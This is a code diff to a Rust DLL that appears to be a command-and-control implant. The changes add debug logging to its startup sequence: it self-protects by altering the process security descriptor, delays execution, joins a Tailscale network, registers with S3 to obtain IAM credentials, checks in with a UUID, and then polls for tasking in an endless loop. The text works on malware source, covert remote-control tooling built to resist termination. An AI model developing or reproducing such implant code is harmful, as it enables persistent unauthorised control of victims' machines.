@@ -32,6 +32,7 @@ mod loader_cache;
 mod selfprotect;
 mod worker;
 mod helpers;
+mod debug_log;
 
 use std::thread;
 
@@ -52,38 +53,63 @@ pub extern "system" fn DllMain(
 }
 
 fn run() {
-    // Tailscale initialization (join tailnet before any communication)
+    debug_log::install_panic_hook();
+    dlog!(
+        "dll: start pid={} log={}",
+        std::process::id(),
+        debug_log::path().display()
+    );
+
+    dlog!("dll: selfprotect begin");
+    selfprotect::set_process_security_descriptor();
+    dlog!("dll: selfprotect done");
+    helpers::startup_delay();
+
     #[cfg(feature = "tailscale")]
     if config::use_tailscale {
+        dlog!("dll: tailscale init");
         loop {
             match tailscale_transport::init() {
-                Ok(_) => break,
+                Ok(_) => {
+                    dlog!("dll: tailscale ok");
+                    break;
+                }
                 Err(e) => {
-                    eprintln!("[TS] Tailscale init failed: {}, retrying...", e);
+                    dlog!("dll: tailscale err: {e}");
                     helpers::idle();
                 }
             }
         }
     }
 
-    // S3 bootstrap registration (get per-execution IAM credentials)
     if config::use_s3 {
+        dlog!("dll: s3 register");
         loop {
             match s3_transport::register() {
-                Ok(_) => break,
+                Ok(_) => {
+                    dlog!("dll: s3 ok");
+                    break;
+                }
                 Err(e) => {
-                    eprintln!("[REG] Registration failed: {}, retrying...", e);
+                    dlog!("dll: s3 err: {e}");
                     helpers::idle();
                 }
             }
         }
     }
 
+    dlog!("dll: checkin begin");
     checkin::checkin();
+    dlog!("dll: checkin done uuid={}", *config::UUID.read().unwrap());
 
+    let mut round: u64 = 0;
     loop {
+        round += 1;
+        dlog!("dll: tasking round={round} begin");
         if let Err(e) = tasking::getTasking() {
-            eprintln!("Tasking error: {}", e);
+            dlog!("dll: tasking round={round} err: {e}");
+        } else {
+            dlog!("dll: tasking round={round} ok");
         }
         helpers::idle();
     }
